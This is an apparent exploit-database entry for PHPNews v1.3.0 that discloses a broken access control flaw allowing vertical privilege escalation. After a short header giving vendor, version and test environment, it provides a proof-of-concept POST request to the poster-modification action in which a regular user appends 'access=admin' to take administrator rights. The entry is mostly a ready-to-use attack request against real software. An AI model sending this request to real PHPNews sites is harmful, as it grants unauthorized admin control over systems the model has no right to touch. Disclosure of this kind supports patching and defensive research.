# Exploit Title: PHPNews v1.3.0 - Broken Object Property Level Authorization(BOPLA)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from BOPLA - Broken Access Control Vulnerability allowing attackers to change his access type to admin(vertical privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php?action=modifynewsposter3 HTTP/1.1
...
id=2&newusername=user1&username=user1&password=user1test&password2=user1test&email=user1%40test.com&language=en_GB&access=admin(ADD THIS)
```